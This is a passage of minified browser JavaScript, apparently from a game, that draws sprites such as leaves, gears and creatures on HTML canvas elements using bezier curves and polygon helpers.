      r.bezierCurveTo(e * 293.5000305175781, e * 196.08523559570312, e * 293.5000305175781, e * 196.08523559570312, e * 293.0000305175781, e * 205.58523559570312);
      r.bezierCurveTo(e * 304.0000305175781, e * 201.08523559570312, e * 304.0000305175781, e * 201.08523559570312, e * 315.0000305175781, e * 196.58523559570312);
      r.bezierCurveTo(e * 350.0000305175781, e * 219.58523559570312, e * 343.0000305175781, e * 221.58523559570312, e * 351.0000305175781, e * 230.58523559570312);
      r.bezierCurveTo(e * 296.0000305175781, e * 260.5852355957031, e * 264.0000305175781, e * 256.5852355957031, e * 220.00003051757812, e * 236.58523559570312);
      r.bezierCurveTo(e * 233.00003051757812, e * 266.5852355957031, e * 232.00003051757812, e * 279.5852355957031, e * 231.00003051757812, e * 295.5852355957031);
      r.bezierCurveTo(e * 222.00003051757812, e * 297.5852355957031, e * 222.00003051757812, e * 297.5852355957031, e * 213.00003051757812, e * 299.5852355957031);
      r.bezierCurveTo(e * 219.50003051757812, e * 308.0852355957031, e * 219.50003051757812, e * 308.0852355957031, e * 226.00003051757812, e * 316.5852355957031);
      r.bezierCurveTo(e * 223.00003051757812, e * 344.5852355957031, e * 216.00003051757812, e * 350.5852355957031, e * 209.00003051757812, e * 363.5852355957031);
      r.bezierCurveTo(e * 154.00003051757812, e * 318.5852355957031, e * 156.00003051757812, e * 268.5852355957031, e * 160.00003051757812, e * 238.58523559570312);
      r.bezierCurveTo(e * 135.00003051757812, e * 268.5852355957031, e * 125.00003051757812, e * 267.5852355957031, e * 112.00003051757812, e * 272.5852355957031);
      r.bezierCurveTo(e * 104.50003051757812, e * 266.5852355957031, e * 104.50003051757812, e * 266.5852355957031, e * 97.00003051757812, e * 260.5852355957031);
      r.bezierCurveTo(e * 93.00003051757812, e * 271.0852355957031, e * 93.00003051757812, e * 271.0852355957031, e * 89.00003051757812, e * 281.5852355957031);
      r.bezierCurveTo(e * 66.00003051757812, e * 288.5852355957031, e * 59.000030517578125, e * 288.5852355957031, e * 39.000030517578125, e * 285.5852355957031);
      r.bezierCurveTo(e * 56.000030517578125, e * 216.58523559570312, e * 91.00003051757812, e * 204.58523559570312, e * 129.00003051757812, e * 189.58523559570312);
      r.bezierCurveTo(e * 90.00003051757812, e * 176.58523559570312, e * 89.00003051757812, e * 173.58523559570312, e * 79.00003051757812, e * 166.58523559570312);
      r.bezierCurveTo(e * 82.00003051757812, e * 155.08523559570312, e * 82.00003051757812, e * 155.08523559570312, e * 85.00003051757812, e * 143.58523559570312);
      r.bezierCurveTo(e * 75.50003051757812, e * 147.58523559570312, e * 75.50003051757812, e * 147.58523559570312, e * 66.00003051757812, e * 151.58523559570312);
      r.bezierCurveTo(e * 44.000030517578125, e * 133.58523559570312, e * 41.000030517578125, e * 124.58523559570312, e * 34.000030517578125, e * 102.58523559570312);
      r.bezierCurveTo(e * 100.00003051757812, e * 81.58523559570312, e * 134.00003051757812, e * 118.58523559570312, e * 150.00003051757812, e * 128.58523559570312);
      r.bezierCurveTo(e * 144.00003051757812, e * 102.58523559570312, e * 147.00003051757812, e * 90.58523559570312, e * 150.00003051757812, e * 80.58523559570312);
      r.bezierCurveTo(e * 159.50003051757812, e * 79.08523559570312, e * 159.50003051757812, e * 79.08523559570312, e * 169.00003051757812, e * 77.58523559570312);
      r.bezierCurveTo(e * 163.00003051757812, e * 72.58523559570312, e * 163.00003051757812, e * 72.58523559570312, e * 157.00003051757812, e * 67.58523559570312);
      r.bezierCurveTo(e * 162.00003051757812, e * 42.585235595703125, e * 169.00003051757812, e * 29.585235595703125, e * 182.00003051757812, e * 14.585235595703125);
      r.bezierCurveTo(e * 219.00003051757812, e * 48.585235595703125, e * 222.00003051757812, e * 92.58523559570312, e * 218.00003051757812, e * 112.58523559570312);
      r.bezierCurveTo(e * 239.00003051757812, e * 95.58523559570312, e * 242.00003051757812, e * 97.58523559570312, e * 249.00003051757812, e * 94.58523559570312);
      r.bezierCurveTo(e * 255.00003051757812, e * 103.08523559570312, e * 255.00003051757812, e * 103.08523559570312, e * 261.0000305175781, e * 111.58523559570312);
      r.bezierCurveTo(e * 261.5000305175781, e * 99.58523559570312, e * 261.5000305175781, e * 99.58523559570312, e * 262.0000305175781, e * 87.58523559570312);
      r.bezierCurveTo(e * 282.0000305175781, e * 77.58523559570312, e * 301.0000305175781, e * 74.58523559570312, e * 314.0000305175781, e * 76.58523559570312);
      r.closePath();
      ye(r, i[1], i[2], e * 4);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 186.00003051757812, e * 192.94886779785156);
      r.bezierCurveTo(e * 185.00003051757812, e * 66.94886779785156, e * 184.50003051757812, e * 104.94886779785156, e * 183.00003051757812, e * 16.948867797851562);
      r.bezierCurveTo(e * 216.00003051757812, e * 47.94886779785156, e * 219.00003051757812, e * 80.94886779785156, e * 218.00003051757812, e * 113.94886779785156);
      r.bezierCurveTo(e * 209.00003051757812, e * 165.94886779785156, e * 200.00003051757812, e * 176.94886779785156, e * 189.00003051757812, e * 192.94886779785156);
      r.closePath();
      ye(r, i[3], i[3], e * 2);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 190.00003051757812, e * 191.94886779785156);
      r.bezierCurveTo(e * 207.00003051757812, e * 348.94886779785156, e * 205.00003051757812, e * 323.94886779785156, e * 209.00003051757812, e * 358.94886779785156);
      r.bezierCurveTo(e * 171.00003051757812, e * 334.94886779785156, e * 167.00003051757812, e * 302.94886779785156, e * 161.00003051757812, e * 268.94886779785156);
      r.bezierCurveTo(e * 160.00003051757812, e * 218.94886779785156, e * 181.00003051757812, e * 191.94886779785156, e * 189.00003051757812, e * 186.94886779785156);
      r.closePath();
      ye(r, i[3], i[3], e * 2);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 194.00003051757812, e * 195.94886779785156);
      r.bezierCurveTo(e * 116.00003051757812, e * 150.94886779785156, e * 116.00003051757812, e * 150.94886779785156, e * 38.000030517578125, e * 105.94886779785156);
      r.bezierCurveTo(e * 67.00003051757812, e * 90.94886779785156, e * 96.00003051757812, e * 99.94886779785156, e * 123.00003051757812, e * 111.94886779785156);
      r.bezierCurveTo(e * 183.00003051757812, e * 152.94886779785156, e * 179.00003051757812, e * 180.94886779785156, e * 193.00003051757812, e * 194.94886779785156);
      r.closePath();
      ye(r, i[3], i[3], e * 2);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 189.00003051757812, e * 190.94886779785156);
      r.bezierCurveTo(e * 250.00003051757812, e * 133.94886779785156, e * 311.0000305175781, e * 78.94886779785156, e * 311.0000305175781, e * 76.94886779785156);
      r.bezierCurveTo(e * 306.0000305175781, e * 127.94886779785156, e * 283.0000305175781, e * 148.94886779785156, e * 261.0000305175781, e * 166.94886779785156);
      r.bezierCurveTo(e * 220.00003051757812, e * 197.94886779785156, e * 191.00003051757812, e * 194.94886779785156, e * 189.00003051757812, e * 195.94886779785156);
      r.closePath();
      ye(r, i[3], i[3], e * 2);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 189.00003051757812, e * 194.94886779785156);
      r.bezierCurveTo(e * 268.5000305175781, e * 211.94886779785156, e * 268.5000305175781, e * 211.94886779785156, e * 348.0000305175781, e * 228.94886779785156);
      r.bezierCurveTo(e * 316.0000305175781, e * 247.94886779785156, e * 298.0000305175781, e * 256.94886779785156, e * 250.00003051757812, e * 246.94886779785156);
      r.bezierCurveTo(e * 197.00003051757812, e * 229.94886779785156, e * 189.00003051757812, e * 202.94886779785156, e * 188.00003051757812, e * 199.94886779785156);
      r.closePath();
      ye(r, i[3], i[3], e * 2);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 192.00003051757812, e * 191.94886779785156);
      r.bezierCurveTo(e * 116.50003051757812, e * 238.44886779785156, e * 116.50003051757812, e * 238.44886779785156, e * 41.000030517578125, e * 284.94886779785156);
      r.bezierCurveTo(e * 49.000030517578125, e * 252.94886779785156, e * 56.000030517578125, e * 242.94886779785156, e * 80.00003051757812, e * 215.94886779785156);
      r.bezierCurveTo(e * 125.00003051757812, e * 181.94886779785156, e * 174.00003051757812, e * 183.94886779785156, e * 192.00003051757812, e * 191.94886779785156);
      r.closePath();
      ye(r, i[3], i[3], e * 2);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 313.0000305175781, e * 76.58523559570312);
      r.bezierCurveTo(e * 308.0000305175781, e * 130.58523559570312, e * 279.0000305175781, e * 158.58523559570312, e * 254.00003051757812, e * 175.58523559570312);
      r.bezierCurveTo(e * 287.0000305175781, e * 182.58523559570312, e * 274.0000305175781, e * 181.08523559570312, e * 294.0000305175781, e * 186.58523559570312);
      r.bezierCurveTo(e * 293.5000305175781, e * 196.08523559570312, e * 293.5000305175781, e * 196.08523559570312, e * 293.0000305175781, e * 205.58523559570312);
      r.bezierCurveTo(e * 304.0000305175781, e * 201.08523559570312, e * 304.0000305175781, e * 201.08523559570312, e * 315.0000305175781, e * 196.58523559570312);
      r.bezierCurveTo(e * 350.0000305175781, e * 219.58523559570312, e * 343.0000305175781, e * 221.58523559570312, e * 351.0000305175781, e * 230.58523559570312);
      r.bezierCurveTo(e * 296.0000305175781, e * 260.5852355957031, e * 264.0000305175781, e * 256.5852355957031, e * 220.00003051757812, e * 236.58523559570312);
      r.bezierCurveTo(e * 233.00003051757812, e * 266.5852355957031, e * 232.00003051757812, e * 279.5852355957031, e * 231.00003051757812, e * 295.5852355957031);
      r.bezierCurveTo(e * 222.00003051757812, e * 297.5852355957031, e * 222.00003051757812, e * 297.5852355957031, e * 213.00003051757812, e * 299.5852355957031);
      r.bezierCurveTo(e * 219.50003051757812, e * 308.0852355957031, e * 219.50003051757812, e * 308.0852355957031, e * 226.00003051757812, e * 316.5852355957031);
      r.bezierCurveTo(e * 223.00003051757812, e * 344.5852355957031, e * 216.00003051757812, e * 350.5852355957031, e * 209.00003051757812, e * 363.5852355957031);
      r.bezierCurveTo(e * 154.00003051757812, e * 318.5852355957031, e * 156.00003051757812, e * 268.5852355957031, e * 160.00003051757812, e * 238.58523559570312);
      r.bezierCurveTo(e * 135.00003051757812, e * 268.5852355957031, e * 125.00003051757812, e * 267.5852355957031, e * 112.00003051757812, e * 272.5852355957031);
      r.bezierCurveTo(e * 104.50003051757812, e * 266.5852355957031, e * 104.50003051757812, e * 266.5852355957031, e * 97.00003051757812, e * 260.5852355957031);
      r.bezierCurveTo(e * 93.00003051757812, e * 271.0852355957031, e * 93.00003051757812, e * 271.0852355957031, e * 89.00003051757812, e * 281.5852355957031);
      r.bezierCurveTo(e * 66.00003051757812, e * 288.5852355957031, e * 59.000030517578125, e * 288.5852355957031, e * 39.000030517578125, e * 285.5852355957031);
      r.bezierCurveTo(e * 56.000030517578125, e * 216.58523559570312, e * 91.00003051757812, e * 204.58523559570312, e * 129.00003051757812, e * 189.58523559570312);
      r.bezierCurveTo(e * 90.00003051757812, e * 176.58523559570312, e * 89.00003051757812, e * 173.58523559570312, e * 79.00003051757812, e * 166.58523559570312);
      r.bezierCurveTo(e * 82.00003051757812, e * 155.08523559570312, e * 82.00003051757812, e * 155.08523559570312, e * 85.00003051757812, e * 143.58523559570312);
      r.bezierCurveTo(e * 75.50003051757812, e * 147.58523559570312, e * 75.50003051757812, e * 147.58523559570312, e * 66.00003051757812, e * 151.58523559570312);
      r.bezierCurveTo(e * 44.000030517578125, e * 133.58523559570312, e * 41.000030517578125, e * 124.58523559570312, e * 34.000030517578125, e * 102.58523559570312);
      r.bezierCurveTo(e * 100.00003051757812, e * 81.58523559570312, e * 134.00003051757812, e * 118.58523559570312, e * 150.00003051757812, e * 128.58523559570312);
      r.bezierCurveTo(e * 144.00003051757812, e * 102.58523559570312, e * 147.00003051757812, e * 90.58523559570312, e * 150.00003051757812, e * 80.58523559570312);
      r.bezierCurveTo(e * 159.50003051757812, e * 79.08523559570312, e * 159.50003051757812, e * 79.08523559570312, e * 169.00003051757812, e * 77.58523559570312);
      r.bezierCurveTo(e * 163.00003051757812, e * 72.58523559570312, e * 163.00003051757812, e * 72.58523559570312, e * 157.00003051757812, e * 67.58523559570312);
      r.bezierCurveTo(e * 162.00003051757812, e * 42.585235595703125, e * 169.00003051757812, e * 29.585235595703125, e * 182.00003051757812, e * 14.585235595703125);
      r.bezierCurveTo(e * 219.00003051757812, e * 48.585235595703125, e * 222.00003051757812, e * 92.58523559570312, e * 218.00003051757812, e * 112.58523559570312);
      r.bezierCurveTo(e * 239.00003051757812, e * 95.58523559570312, e * 242.00003051757812, e * 97.58523559570312, e * 249.00003051757812, e * 94.58523559570312);
      r.bezierCurveTo(e * 255.00003051757812, e * 103.08523559570312, e * 255.00003051757812, e * 103.08523559570312, e * 261.0000305175781, e * 111.58523559570312);
      r.bezierCurveTo(e * 261.5000305175781, e * 99.58523559570312, e * 261.5000305175781, e * 99.58523559570312, e * 262.0000305175781, e * 87.58523559570312);
      r.bezierCurveTo(e * 282.0000305175781, e * 77.58523559570312, e * 301.0000305175781, e * 74.58523559570312, e * 314.0000305175781, e * 76.58523559570312);
      r.closePath();
      ye(r, undefined, i[2], e * 4);
      return t;
    }
    function ut(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 248;
      r.height = e * 128;
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 137, e * 7);
      n.bezierCurveTo(e * 169, e * 14, e * 212, e * 9, e * 241, e * 5);
      n.bezierCurveTo(e * 211, e * 63, e * 158, e * 92, e * 103, e * 109);
      n.bezierCurveTo(e * 73, e * 126, e * 54, e * 124, e * 6, e * 99);
      n.bezierCurveTo(e * 82, e * 63, e * 113, e * 35, e * 137, e * 8);
      n.closePath();
      ye(n, t[0], t[1], e * 14);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 73, e * 124);
      n.bezierCurveTo(e * 111, e * 126, e * 162, e * 97, e * 203, e * 61);
      n.bezierCurveTo(e * 156, e * 98, e * 131, e * 106, e * 105, e * 109);
      n.bezierCurveTo(e * 99, e * 121, e * 87, e * 124, e * 72, e * 124);
      n.closePath();
      ye(n, t[2], t[3], e * 1);
      return r;
    }
    function lt(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 130;
      r.height = e * 148;
      n.globalAlpha = i ? 0.5 : 1;
      n.save();
      n.translate(e * 65, e * 85);
      n.rotate(1.4);
      Ve(n, 7, e * 60, e * 10);
      n.restore();
      ye(n, t[0]);
      n.globalAlpha = 1;
      n.save();
      n.translate(e * 65, e * 74);
      n.rotate(1.4);
      Ve(n, 7, e * 60, e * 10);
      ye(n, t[1], t[2], 4);
      n.rotate(0.64);
      Ve(n, 7, e * 40, e * 10);
      ye(n, t[3], t[4], 4);
      n.rotate(0.12);
      Ve(n, 7, e * 23, e * 5);
      n.restore();
      ye(n, t[5]);
      return r;
    }
    function Ot(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 125;
      r.height = e * 139;
      n.globalAlpha = i ? 0.5 : 1;
      n.save();
      n.translate(e * 63, e * 79);
      n.rotate(1);
      Ve(n, 8, e * 60, e * 10);
      ye(n, t[0]);
      n.restore();
      n.globalAlpha = 1;
      n.save();
      n.translate(e * 63, e * 69);
      n.rotate(1);
      Ve(n, 8, e * 60, e * 10);
      ye(n, t[1], t[2], 4);
      n.rotate(0.56);
      Ve(n, 8, e * 40, e * 10);
      ye(n, t[3], t[4], 4);
      n.rotate(0.28);
      Ve(n, 8, e * 28, e * 8);
      ye(n, t[5]);
      n.restore();
      return r;
    }
    function ct(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 90;
      r.height = e * 101;
      n.translate(e * 0, e * 5);
      if (Me === 0) {
        n.globalAlpha = i ? 0.5 : 1;
        ze(n, e * 44, e * 55, e * 41);
        ye(n, t[0]);
      }
      n.globalAlpha = 1;
      ze(n, e * 44, e * 45, e * 41);
      ye(n, t[1], t[2], e * 4);
      ze(n, e * 44, e * 45, e * 31);
      ye(n, t[3]);
      n.save();
      n.translate(e * 45, e * 45);
      Be(n, e * -9, e * -25.5, e * 18, e * 51, e * 30);
      n.restore();
      ye(n, t[4], t[4], e * 2);
      n.save();
      n.translate(e * 45, e * 45);
      Be(n, e * -26, e * -9, e * 52, e * 18, e * 30);
      n.restore();
      ye(n, t[4], t[4], e * 2);
      ze(n, e * 45, e * 29, e * 7);
      ye(n, t[5]);
      ze(n, e * 45, e * 61, e * 7);
      ye(n, t[5]);
      ze(n, e * 28, e * 45, e * 7);
      ye(n, t[5]);
      ze(n, e * 62, e * 45, e * 7);
      ye(n, t[5]);
      return r;
    }
    function Rt(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 90;
      r.height = e * 98;
      n.translate(0, e * 4);
      if (Me === 0) {
        n.globalAlpha = i ? 0.5 : 1;
        n.save();
        n.translate(e * 44, e * 50);
        n.rotate(1.4);
        Ve(n, 7, e * 41, e * 10);
        n.restore();
        ye(n, t[0]);
      }
      n.globalAlpha = 1;
      n.save();
      n.translate(e * 44, e * 44);
      n.rotate(1.4);
      Ve(n, 7, e * 41, e * 10);
      ye(n, t[1], t[2], e * 4);
      Ve(n, 7, e * 35, e * 10);
      ye(n, t[3], t[4], e * 4);
      Ve(n, 7, e * 23, e * 5);
      n.restore();
      ye(n, t[5]);
      n.save();
      n.translate(e * 45, e * 45);
      n.rotate(0);
      Be(n, e * -9, e * -25.5, e * 18, e * 51, e * 30);
      n.restore();
      ye(n, t[4], t[4], e * 2);
      n.save();
      n.translate(e * 45, e * 45);
      n.rotate(0);
      Be(n, e * -26, e * -9, e * 52, e * 18, e * 30);
      n.restore();
      ye(n, t[4], t[4], e * 2);
      ze(n, e * 45, e * 29, e * 7);
      ye(n, t[5]);
      ze(n, e * 45, e * 61, e * 7);
      ye(n, t[5]);
      ze(n, e * 28, e * 45, e * 7);
      ye(n, t[5]);
      ze(n, e * 62, e * 45, e * 7);
      ye(n, t[5]);
      return r;
    }
    function gt(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 90;
      r.height = e * 98;
      n.translate(0, e * 4);
      if (Me === 0) {
        n.globalAlpha = i ? 0.5 : 1;
        n.save();
        n.translate(e * 44, e * 50);
        n.rotate(1);
        Ve(n, 8, e * 41, e * 10);
        ye(n, t[0]);
        n.restore();
      }
      n.globalAlpha = 1;
      n.save();
      n.translate(e * 44, e * 44);
      n.rotate(1);
      Ve(n, 8, e * 41, e * 10);
      ye(n, t[1], t[2], e * 4);
      n.rotate(0.56);
      Ve(n, 8, e * 33, e * 10);
      ye(n, t[3], t[4], e * 4);
      n.rotate(0.28);
      Ve(n, 8, e * 24, e * 8);
      ye(n, t[5]);
      n.restore();
      n.save();
      n.translate(e * 45, e * 45);
      n.rotate(0);
      Be(n, e * -9, e * -25.5, e * 18, e * 51, e * 30);
      n.restore();
      ye(n, t[4], t[4], e * 2);
      n.save();
      n.translate(e * 45, e * 45);
      n.rotate(0);
      Be(n, e * -26, e * -9, e * 52, e * 18, e * 30);
      n.restore();
      ye(n, t[4], t[4], e * 2);
      ze(n, e * 45, e * 29, e * 7);
      ye(n, t[5]);
      ze(n, e * 45, e * 61, e * 7);
      ye(n, t[5]);
      ze(n, e * 28, e * 45, e * 7);
      ye(n, t[5]);
      ze(n, e * 62, e * 45, e * 7);
      ye(n, t[5]);
      return r;
    }
    function Ct(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 300;
      r.height = e * 300;
      n.globalAlpha = i ? 0.5 : 1;
      n.save();
      n.translate(e * 150, e * 160);
      n.rotate(6.28);
      Ve(n, 6, e * 146, e * 30);
      n.restore();
      ye(n, t[0]);
      n.globalAlpha = 1;
      n.save();
      n.translate(e * 150, e * 150);
      n.rotate(6.28);
      Ve(n, 6, e * 146, e * 30);
      n.restore();
      ye(n, t[1], t[2], e * 8);
      n.save();
      n.translate(e * 150, e * 150);
      n.rotate(0);
      Ve(n, 6, e * 105, e * 30);
      n.restore();
      ye(n, t[3], t[3], e * 8);
      n.save();
      n.translate(e * 150, e * 150);
      n.rotate(0);
      Ve(n, 6, e * 66, e * 30);
      n.restore();
      ye(n, t[4], t[2], e * 8);
      n.save();
      n.translate(e * 150, e * 150);
      n.rotate(0);
      Ve(n, 6, e * 31, e * 30);
      n.restore();
      ye(n, t[5], t[6], e * 8);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 150, e * 207);
      n.bezierCurveTo(e * 150, e * 151, e * 150, e * 101, e * 150, e * 94);
      n.closePath();
      ye(n, undefined, t[2], e * 8);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 118, e * 100);
      n.bezierCurveTo(e * 118, e * 205, e * 118, e * 207, e * 118, e * 200);
      n.closePath();
      ye(n, undefined, t[2], e * 8);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 183, e * 100);
      n.bezierCurveTo(e * 183, e * 203, e * 183, e * 203, e * 183, e * 200);
      n.closePath();
      ye(n, undefined, t[2], e * 8);
      return r;
    }
    function Nt(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 300;
      r.height = e * 300;
      n.globalAlpha = i ? 0.5 : 1;
      n.save();
      n.translate(e * 150, e * 160);
      n.rotate(6.28);
      Ve(n, 6, e * 146, e * 30);
      n.restore();
      ye(n, t[0]);
      n.globalAlpha = 1;
      n.save();
      n.translate(e * 150, e * 150);
      n.rotate(6.28);
      Ve(n, 6, e * 146, e * 30);
      n.restore();
      ye(n, t[1], t[2], e * 8);
      n.save();
      n.translate(e * 150, e * 150);
      n.rotate(0);
      Ve(n, 6, e * 105, e * 30);
      n.restore();
      ye(n, t[3], t[3], e * 8);
      n.save();
      n.translate(e * 150, e * 150);
      n.rotate(0);
      Ve(n, 6, e * 66, e * 30);
      n.restore();
      ye(n, t[4], t[2], e * 8);
      n.save();
      n.translate(e * 131, e * 116);
      Ve(n, 7, e * 17, e * 8);
      n.restore();
      ye(n, t[6]);
      n.save();
      n.translate(e * 163, e * 168);
      Ve(n, 7, e * 25, e * 8);
      n.restore();
      ye(n, t[6]);
      n.save();
      n.translate(e * 117, e * 151);
      Ve(n, 7, e * 11, e * 8);
      n.restore();
      ye(n, t[6]);
      n.save();
      n.translate(e * 167, e * 122);
      Ve(n, 7, e * 12, e * 8);
      n.restore();
      ye(n, t[6]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 150, e * 207);
      n.bezierCurveTo(e * 150, e * 151, e * 150, e * 101, e * 150, e * 94);
      n.closePath();
      ye(n, undefined, t[2], e * 8);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 118, e * 100);
      n.bezierCurveTo(e * 118, e * 205, e * 118, e * 207, e * 118, e * 200);
      n.closePath();
      ye(n, undefined, t[2], e * 8);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 183, e * 100);
      n.bezierCurveTo(e * 183, e * 203, e * 183, e * 203, e * 183, e * 200);
      n.closePath();
      ye(n, undefined, t[2], e * 8);
      return r;
    }
    function bt(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 90;
      r.height = e * 98;
      n.translate(0, e * 4);
      if (Me === 0) {
        n.globalAlpha = i ? 0.5 : 1;
        n.save();
        n.translate(e * 44, e * 50);
        n.rotate(0.2);
        Ve(n, 9, e * 41, e * 10);
        n.restore();
        ye(n, t[0]);
      }
      n.globalAlpha = 1;
      n.save();
      n.translate(e * 44, e * 44);
      n.rotate(0.2);
      Ve(n, 9, e * 41, e * 10);
      ye(n, t[1], t[2], e * 4);
      n.rotate(-0.32);
      Ve(n, 9, e * 32, e * 10);
      ye(n, t[3], t[4], e * 4);
      n.rotate(0.68);
      Ve(n, 9, e * 23, e * 8);
      ye(n, t[5], t[6], e * 6);
      n.restore();
      n.save();
      n.translate(e * 45, e * 45);
      n.rotate(0);
      Be(n, e * -9, e * -25.5, e * 18, e * 51, e * 30);
      n.restore();
      ye(n, t[4], t[4], e * 2);
      n.save();
      n.translate(e * 45, e * 45);
      n.rotate(0);
      Be(n, e * -26, e * -9, e * 52, e * 18, e * 30);
      n.restore();
      ye(n, t[4], t[4], e * 2);
      ze(n, e * 45, e * 29, e * 7);
      ye(n, t[5]);
      ze(n, e * 45, e * 61, e * 7);
      ye(n, t[5]);
      ze(n, e * 28, e * 45, e * 7);
      ye(n, t[5]);
      ze(n, e * 62, e * 45, e * 7);
      ye(n, t[5]);
      return r;
    }
    function Dt(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 135;
      r.height = e * 120;
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 3.5, e * 55.25);
      n.bezierCurveTo(e * 3.5, e * 114.25, e * 2.5, e * 109.25, e * 3.5, e * 112.25);
      n.bezierCurveTo(e * 5.5, e * 119.25, e * 8.5, e * 119.25, e * 11.5, e * 119.25);
      n.bezierCurveTo(e * 15.5, e * 114.25, e * 13.5, e * 95.25, e * 14.5, e * 82.25);
      n.closePath();
      ye(n, t[0], t[1], e * 7);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 6.5, e * 43.25);
      n.bezierCurveTo(e * 3.5, e * 27.25, e * 7.5, e * 20.25, e * 25.5, e * 11.25);
      n.bezierCurveTo(e * 45.5, e * -0.75, e * 73.5, e * 1.25, e * 107.5, e * 10.25);
      n.bezierCurveTo(e * 131.5, e * 21.25, e * 125.5, e * 34.25, e * 125.5, e * 36.25);
      n.closePath();
      ye(n, t[0], t[1], e * 7);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 120.5, e * 62.25);
      n.bezierCurveTo(e * 121.5, e * 95.25, e * 120.5, e * 80.25, e * 120.5, e * 100.25);
      n.bezierCurveTo(e * 118.5, e * 119.25, e * 123.5, e * 118.25, e * 129.5, e * 113.25);
      n.bezierCurveTo(e * 133.5, e * 107.25, e * 130.5, e * 97.25, e * 130.5, e * 87.25);
      n.bezierCurveTo(e * 129.5, e * 56.25, e * 130, e * 70.75, e * 129.5, e * 54.25);
      n.closePath();
      ye(n, t[0], t[1], e * 7);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 17.5, e * 27);
      n.bezierCurveTo(e * 48.5, e * 5, e * 93.5, e * 14, e * 118.5, e * 26);
      n.bezierCurveTo(e * 132.5, e * 35, e * 133.5, e * 52, e * 132.5, e * 68);
      n.bezierCurveTo(e * 125.5, e * 87, e * 116.5, e * 84, e * 96.5, e * 75);
      n.bezierCurveTo(e * 60.5, e * 66, e * 52.5, e * 74, e * 37.5, e * 78);
      n.bezierCurveTo(e * 2.5, e * 86, e * 3.5, e * 78, e * 1.5, e * 61);
      n.bezierCurveTo(e * 1.5, e * 37, e * 9.5, e * 32, e * 15.5, e * 28);
      n.closePath();
      ye(n, t[2], t[3], e * 7);
      return r;
    }
    function St(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 501;
      r.height = e * 309;
      n.translate(0, e * 6);
      n.globalAlpha = i ? 0.5 : 1;
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 126, e * 184);
      n.bezierCurveTo(e * 169, e * 196, e * 194, e * 198, e * 227, e * 198);
      n.bezierCurveTo(e * 235, e * 222, e * 236, e * 223, e * 241, e * 226);
      n.bezierCurveTo(e * 245, e * 228, e * 257, e * 228, e * 263, e * 226);
      n.bezierCurveTo(e * 267, e * 225, e * 270, e * 211, e * 275, e * 198);
      n.bezierCurveTo(e * 332, e * 194, e * 347, e * 192, e * 372, e * 188);
      n.bezierCurveTo(e * 366, e * 174.5, e * 366, e * 174.5, e * 360, e * 161);
      n.bezierCurveTo(e * 253.5, e * 162, e * 253.5, e * 162, e * 147, e * 163);
      n.closePath();
      ye(n, t[0]);
      n.globalAlpha = 1;
      n.translate(0, e * -6);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 100, e * 116);
      n.bezierCurveTo(e * 90, e * 101, e * 96, e * 89, e * 106, e * 83);
      n.bezierCurveTo(e * 86, e * 79, e * 86, e * 52, e * 93, e * 38);
      n.bezierCurveTo(e * 99, e * 51, e * 107, e * 57, e * 122, e * 63);
      n.bezierCurveTo(e * 130, e * 53, e * 141, e * 46, e * 161, e * 46);
      n.bezierCurveTo(e * 157, e * 31, e * 158, e * 20, e * 169, e * 6);
      n.bezierCurveTo(e * 171, e * 24, e * 186, e * 33, e * 198, e * 45);
      n.bezierCurveTo(e * 252, e * 45, e * 252, e * 45, e * 306, e * 45);
      n.bezierCurveTo(e * 323, e * 33, e * 332, e * 21, e * 335, e * 7);
      n.bezierCurveTo(e * 349, e * 21, e * 347, e * 36, e * 345, e * 46);
      n.bezierCurveTo(e * 364, e * 46, e * 369, e * 48, e * 377, e * 63);
      n.bezierCurveTo(e * 398, e * 58, e * 403, e * 49, e * 409, e * 40);
      n.bezierCurveTo(e * 419, e * 57, e * 411, e * 79, e * 398, e * 85);
      n.bezierCurveTo(e * 405, e * 100, e * 405, e * 106, e * 401, e * 118);
      n.bezierCurveTo(e * 332.5, e * 128.5, e * 332.5, e * 128.5, e * 264, e * 139);
      n.closePath();
